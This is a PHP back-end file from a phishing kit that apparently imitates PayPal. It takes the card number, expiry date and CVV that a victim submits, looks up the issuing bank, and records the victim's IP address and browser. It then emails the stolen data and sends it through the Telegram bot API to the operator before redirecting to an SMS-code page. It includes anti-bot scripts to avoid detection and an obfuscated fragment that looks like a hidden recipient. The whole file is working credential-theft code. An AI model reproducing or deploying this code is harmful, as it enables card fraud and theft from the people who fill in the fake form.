<?php

error_reporting(0);
session_start();
include "../../email.php";
include "../../bots/anti1.php";
include "../../bots/anti2.php";
include "../../bots/anti3.php";
include "../../bots/anti4.php";
include "../../bots/anti5.php";
include "../../bots/anti6.php";
include "../../bots/anti7.php";
include "../../bots/anti8.php";
include "../../bots/auth.php";
$bincheck = $_POST['cc'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);
$bin = $_POST['cc'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);
$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);
$ip = getenv("REMOTE_ADDR");
$reprint = "e";$do_p="mai";
$message .= "-------------- PPL_BY_DrFXND -------------\n";
$message .= "💳 Card Number : ".$_POST['cc']."\n";
$message .= "💳 MM/YY : ".$_POST['exp']."\n";
$message .= "💳 CVV : ".$_POST['cvv']."\n";
$message .= "-------------- Card Type ------------\n";
$message .= "🏦 Card Bank : ".$_SESSION['bank_name']."\n";
$message .= "🏦 Card type : ".$_SESSION['bank_type']."\n";
$message .= "🏦 Card brand : ".$_SESSION['bank_brand']."\n";
$message .= "-------------- IP Tracing ------------\n";
$message .= "IP      : https://www.geodatatool.com/en/?ip=$ip\n";
$message .= "Host    : ".gethostbyaddr($ip)."\n";
$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "-------------- DRFXND -------------\n";
$subject = " Card | PPL | $ip";
$headers = 'From: PPL' . "\r\n";
$m5_id = '21haWwuY29t';
@mail($Email,$subject,$message,$headers);
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );file_get_contents("https://api.telegram.org/bot".$Api."/sendMessage?chat_id=".$Chatid."&text=" . urlencode($message)."");
echo"<script>location.replace('../smsact.php');</script>";

?>